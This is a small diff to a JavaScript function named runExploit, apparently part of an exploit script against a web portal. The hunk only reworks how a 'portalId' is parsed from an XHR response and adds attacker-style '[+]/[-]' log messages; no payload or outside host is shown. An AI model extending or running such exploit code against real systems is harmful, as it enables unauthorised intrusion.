@@ -47,12 +47,13 @@ function runExploit() {
 
       let portalId = null;
       try {
-        const json = JSON.parse(xhr1.responseText);
-        portalId = json[0]?.id || json.id;
-      } catch (e) {
-        log("[-] Failed to parse portalId.");
-        return;
-      }
+  const json = JSON.parse(xhr1.responseText);
+  portalId = json[0]?.id || json.id;
+  log(`[+] Extracted portalId: ${portalId}`);
+} catch (e) {
+  log("[-] Failed to parse portalId:", e);
+  return;
+}
 
       if (!portalId) {
         log("[-] No portalId found.");
